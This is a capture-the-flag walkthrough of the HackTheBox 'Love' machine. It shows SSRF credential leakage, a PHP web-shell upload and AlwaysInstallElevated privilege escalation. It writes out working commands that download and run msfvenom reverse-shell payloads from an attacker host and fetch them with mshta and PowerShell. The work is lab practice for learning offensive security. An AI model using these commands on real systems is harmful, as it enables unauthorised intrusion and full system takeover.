@@ -1,0 +1,159 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Love HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/love-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-09-29T17:58:33+00:00">September 29, 2021</time><time class="updated" datetime="2025-06-20T17:04:41+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Love is a CTF hosted on Hack the Box with Beginner categories. The objective for the participant is to identify the files user.txt and root.txt on the victim’s system.</span></p>
+<h3><span style="color: #800000;">Penetration Methodlogies</span></h3>
+<p><span style="color: #000000;"><strong>1<sup>st</sup> Method</strong></span></p>
+<p><strong><span style="color: #000000;">Recon</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Dirb</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Exploit</span></strong></p>
+<ul>
+<li><span style="color: #000000;">SSRF</span></li>
+<li><span style="color: #000000;">Unrestricted file upload to RCE</span></li>
+<li><span style="color: #000000;">Reverse Shell via Metasploit</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Post Enumeration</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Capture User.txt</span></li>
+<li><span style="color: #000000;">Always installed Elevated Permission</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Abusing Always installed Elevated</span></li>
+<li><span style="color: #000000;">Capture Root.txt</span></li>
+</ul>
+<p><strong><span style="color: #000000;">2<sup>nd</sup> Method</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Exploit</span></li>
+<li><span style="color: #000000;">Privilege Escalation</span></li>
+</ul>
+<h3><span style="color: #800000;">1<sup>st</sup> Method</span></h3>
+<h3><span style="color: #800000;">Recon</span></h3>
+<p><span style="color: #000000;"><strong>Nmap</strong></span></p>
+<p><span style="color: #000000;">Let’s begin with a Nmap version scan to discover open and running services and their versions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –sV 10.129.223.226</pre>
+<p><span style="color: #000000;">Based on the scan results, we can see that apache httpd services are operating on ports 80,443, and 5000, plus port 445 indicating that this is a Windows OS.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VS8PfSqSgdA/YVSgM7LCcGI/AAAAAAAAyvQ/kBzNCu5mUHA9w9yiIr2oaP-z_9R1tuGNgCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">In addition, we investigate port 80 in a web browser, which displays the login screen for a voting system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CUlDvqBQd9A/YVSgVSgw4DI/AAAAAAAAyvY/Ce7zeAvPu_I5RE3jQe4am2I9znrRtDCWgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><strong><span style="color: #000000;">Enumeration </span></strong></p>
+<p><span style="color: #000000;">Then, in the web browser, we investigate the target IP through port 443, but it returns Forbidden and prevents us from accessing that page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-G1STlh18wuc/YVSgZl9xI_I/AAAAAAAAyvc/WUD1Xfu8SG0aK_sOenDY0qwE5TwZfW52QCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We try to get the certificate because the website was accessible through port 443 and we see the organisation Unit “love.htb” and common Name “staging.love.htb”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mRO94d-3jXw/YVSgfOUBoqI/AAAAAAAAyvk/w50vcF25o1Y8Oq6LgtHdu5nHsVD-WuPKQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">By changing the sub-domain name in the /etc/hosts file, we may add host:</span></p>
+<p><strong><span style="color: #000000;">10.129.223.226 staging.love.htb love.htb</span></strong></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZT9AAo0yN0k/YVSgjkm50pI/AAAAAAAAyvo/e8ZqZeJ0uigE0mIDccATyI_HY5ZDq4-VgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">The file scanning service, which was supposed to identify malware, was found through staging.love.htb.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-36TDV0GMIe4/YVSgn1snsuI/AAAAAAAAyvs/7eFGRcYniDAwyFfUDWA-dCl1-BdwXnigwCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;"><strong>Dirb</strong></span></p>
+<p><span style="color: #000000;">Without further ado, we will do a web directory brute force attack using dirb, which will return two web directories: /admin and /image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://love.htbdirb http://love.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kujPuVMU1NI/YVSguLGbMtI/AAAAAAAAyv0/EAWycKrPg9EjeX6rVRZJ9rZVfdpgkHVCwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">When you search for http://love.htb/admin, you will see the same admin login screen that we mentioned earlier. Let’s see if we can get our hands on some admin credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mpVaeZnYHAQ/YVSgy0-qfRI/AAAAAAAAyv8/a4u7QdRkGdgYzcldp1y65fsLg0xYNdC8gCLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Exploit</span></h3>
+<p><span style="color: #000000;"><strong>Testing SSRF</strong></span></p>
+<p><span style="color: #000000;">Returning to the File Scanner web page, we’ll attempt to test SSRF by scanning the following URL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://127.0.0.1:5000</pre>
+<p><span style="color: #000000;">Bravo!!!! It works 😁</span></p>
+<p><span style="color: #000000;">As a result, the website was vulnerable to <strong>Server Side Request Forgery (SSRF)</strong>, leading in the display of the Password Dashboard. As a response, it will give credentials to the administrator, which we may use to access the voting system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">User = "admin"
+Pass = "@LoveIsInTheAir!!!!"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VsJdXGgnBco/YVSg3u8P2RI/AAAAAAAAywI/PlEQb7f9PmkS2KITAgpciwfOVzqtTiRgACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Besides the update profile option, the admin dashboard contains no relevant information when logging into the web app.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L5aPS_CPPbE/YVSg8OxssYI/AAAAAAAAywM/onwAB8uN3fAy0N_0x5LZ6FEq9PPi6IllwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;"><strong>Unrestricted File Upload to RCE</strong></span></p>
+<p><span style="color: #000000;">We discovered an upload feature for uploading profile photographs while updating the admin profile. We’ll attempt to upload a PHP backdoor here.</span></p>
+<p><span style="color: #000000;">You may upload simple-backdoor.php by browsing to the directory /usr/share/webshell/php.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nra3gOT5oFs/YVShAR1M_OI/AAAAAAAAywQ/pPS3F-RO72AxrxMhDBO1FkQ8IAIgTtgngCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">The injected PHP script will be uploaded to the /image directory once you change the admin profile.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D9UoPGYVFak/YVShG5KJyBI/AAAAAAAAywU/sH7EVmbaPB4jmsAAgAxzQC7OjEXXCZTkQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Let’s run the php script in the web browser by typing in the URL below. As an output result for whoami, this will give you user account details.</span></p>
+<p><span style="color: #000000;">http://love.htb/images/simple-backdoor.php?cmd=whoami</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wm6cY_4PR6I/YVShMa4pnGI/AAAAAAAAywg/pfXdW7lX660eknr1BjKrtFf1vaRsp48-wCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;"><strong>Reverse Shell</strong></span></p>
+<p><span style="color: #000000;">Let’s try the reverse connection by running Metasploit payload via simple-backdoor.php. In this case, we will utilise the following module to create a malicious HTA file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
+set srvhost 10.10.14.100
+set lhost 10.10.14.100
+exploit</pre>
+<p><span style="color: #000000;">Wait for the reverse connection after running the hta file link through simple-backdoor.php.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xnUFH8LIoOk/YVShSpuZIUI/AAAAAAAAywk/V4028mq3x4w-E6dQG0XzZm-A__bTMO2nwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://love.htb/images/simple-backdoor.php?cmd=mshta.exe http://10.10.14.100:8080/1Tva0HNPx.hta</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lshz5q2XAXE/YVShW4zBwcI/AAAAAAAAyws/WgZuhr6znNovzWlhUSiR_V1UrT3op46eACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">After that, we’ll have a meterpreter session, so let’s do some post-enumeration and look for the user.txt file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VtdJLsiCsUw/YVShbv0YfkI/AAAAAAAAyww/_nAV4GGtjhkGw-PfnteRcyh0FZlkbh96ACLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;">Post Enumeration</span></h3>
+<p><span style="color: #000000;"><strong>User.txt Flag</strong></span></p>
+<p><span style="color: #000000;">You will find your first flag at C:\Users\Phoebe\Desktop. Let’s crawl some more and look for weak or misconfigured links in order to elevate privilege for Phoebe.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-leU3GqxGSAE/YVShh1OFiEI/AAAAAAAAyw4/ptRhfzZ7SLY4CGljqZuA76ckug-WjynJACLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Winpeas.exe</strong></span></p>
+<p><span style="color: #000000;">In order to elevate privileges, we need to enumerate different files, directories, permissions, logs and SAM files. The number of files inside a Windows OS is very overwhelming. We will be using <span style="color: #0000ff;"><strong><a style="color: #0000ff; text-decoration: underline;" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md">winpeas</a> </strong></span>to enumerate vulnerable vector that can be exploited for privilege escalation.</span></p>
+<p><span style="color: #000000;">Upload the winpeas inside /temp directory and execute the script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/Downloads/winPEASx64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RZjvPMj3eQ0/YVShnWA8zZI/AAAAAAAAyxE/W3PtlN8vmJs9KghVsohdQ9U1P4iBcbF3wCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">To execute the exe file let’s interact with cmd with the help of shell command and then run the application from inside the temp directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+winPEASx64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fHd4pdAks-g/YVShsTIBWuI/AAAAAAAAyxI/NIVRlyrF-DUKck_ov2vTPld1-fGUyNKeQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">As a consequence, the registry key for AlwaysInstallElevated is set to 1 (True), allowing us to inject any MSI file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4lSb6jwR1oM/YVShxHIsvCI/AAAAAAAAyxM/2xnxNiuTUPIb5MM-xNKnZYsNV5hXgu49gCLcBGAsYHQ/s16000/20.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Because AlwaysInstallElevated was enabled, we may do post-exploitation using the Metasploit module shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/always_install_elevated
+set lhost 10.10.14.100
+set session 2
+set lport 8888</pre>
+<p><span style="color: #000000;">Kudos!!!!! It will provide fully privilege meterpreter as NT-Authority/system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DTco35CzwoY/YVSh3z4VzSI/AAAAAAAAyxU/EA78o6vK2ac_1UXJz7Kyd-0k120MJfAEwCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Once you will we get administrator privilege shell, then go for root.txt flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ugXKYuapGw8/YVSiBqcrXqI/AAAAAAAAyxg/SAHjtEm0UycRB9URkLlSF0rvNsm7_Jv7ACLcBGAsYHQ/s16000/22.png"/></span></p>
+<h3><span style="color: #000000;">2<sup>nd</sup> Method </span></h3>
+<p><span style="color: #000000;">Once you insert the malicious php script, it will produce a remote code execution vulnerability, allowing us to perform arbitrary system commands, such as net users.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jGAn4n8qYp4/YVSiHvjygWI/AAAAAAAAyxk/aBFApHuD4h0pti6qCtLyexnrT5LJknfCgCLcBGAsYHQ/s16000/50.png"/></span></p>
+<p><span style="color: #000000;">You will be able to read the user.txt file using this method.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://love.htb/images/simple-backdoor.php?cmd=dir c:\users\Phoebe\Desktop</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K7Od9tGiP_M/YVSiMPixxPI/AAAAAAAAyxo/RWQ9AWAnVCctJurjJQtc3MY-3QbciEStQCLcBGAsYHQ/s16000/51.png"/></span></p>
+<p><span style="color: #000000;">And here is our first flag, as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://love.htb/images/simple-backdoor.php?cmd=type c:\users\Phoebe\Desktop\user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p5v_8LuPQN0/YVSiSrYK1EI/AAAAAAAAyxw/2b76hcdQVpQDd8eKxKdEPhFglVVfumvmACLcBGAsYHQ/s16000/52.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation </span></h3>
+<p><span style="color: #000000;">We can use arbitrary RCE to inject a malicious exe file onto the target system. For this, we will use msfvenom to build a malicious exe with the command given below, and then establish a Python HTTP server to send data.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=10.10.14.100 lport=9999 –f exe &gt;shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6kVNL3pSy2w/YVSigOfa3HI/AAAAAAAAyx8/NH5Gwha3vbUJVWjQc1npwBokib0stxQ5wCLcBGAsYHQ/s16000/53.png"/></span></p>
+<p><span style="color: #000000;">Upload the shell.exe by executing the following URL:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://love.htb/images/simple-backdoor.php?cmd=powershell.exe wget http://10.10.14.100/shell.exe -o c:\users\Phoebe\shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pJaZ8FOd_1g/YVSimOOyfjI/AAAAAAAAyyE/-HX6AwGp88Qg1sSOLXwC97s0TarBypIBQCLcBGAsYHQ/s16000/54.png"/></span></p>
+<p><span style="color: #000000;">Run shell.exe in your web browser, and don’t forget to launch netcat in the background on port 9999.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://love.htb/images/simple-backdoor.php?cmd=c:\users\Phoebe\shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PmrTrebTq4w/YVSisGYn3NI/AAAAAAAAyyI/Oh0tYurSU8AqK7qTp3DuRXtSLvWXHysCACLcBGAsYHQ/s16000/55.png"/></span></p>
+<p><span style="color: #000000;">You will be given a netcat session as the Phoebe account as soon as the command is executed. Upload winpeasx64.exe without spending much time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.14.100/winPEASx64.exe -o winPEASx64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JzvlPvferzw/YVSixZ2yXnI/AAAAAAAAyyQ/O9vrkfiuTekRhU6YXRAt_Dt0051QspaawCLcBGAsYHQ/s16000/56.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">When you run winpeas.exe, it will identify misconfigurations that may assist you to obtain the vector vulnerable to privilege escalation. The system was improperly configured to ALwaysInstallElevated privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TcuumriD3nc/YVSi9c3FK_I/AAAAAAAAyyc/oSxkNSmB7c0lhkrdo-lytSqLPscxLTdEgCLcBGAsYHQ/s16000/57.png"/></span></p>
+<p><span style="color: #000000;">Next, we will be using msfvenom for the generation of a malicious MSI file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.100 lport=5545 -f msi &gt; priv.msi</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LzmIuRgOMIE/YVSjcRngw4I/AAAAAAAAyys/cuBud2R8Ez8hyCyevW41wrCfqHeBj-qHQCLcBGAsYHQ/s16000/58.png"/></span></p>
+<p><span style="color: #000000;">Upload and execute the MSI file with the help of the following command and start a new nectat listener in a new terminal on port 5545</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd c:\users\public
+powershell.exe wget http://10.10.14.100/priv.msi -o priv.msi
+msiexec /quiet /qn /i priv.msi</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d3OCkF3kCQI/YVSjiQCCx1I/AAAAAAAAyyw/hG-ugFZQzWsMKYtucvfhVbEyow8VIDqowCLcBGAsYHQ/s16000/59.png"/></span></p>
+<p><span style="color: #000000;">You will get a new netcat session with administrative privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n8QHk3JOXzo/YVSjnhHq-9I/AAAAAAAAyy0/JP9bXCFiTWchlgDrQMfE__Y_gQy7jmbiwCLcBGAsYHQ/s16000/60.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
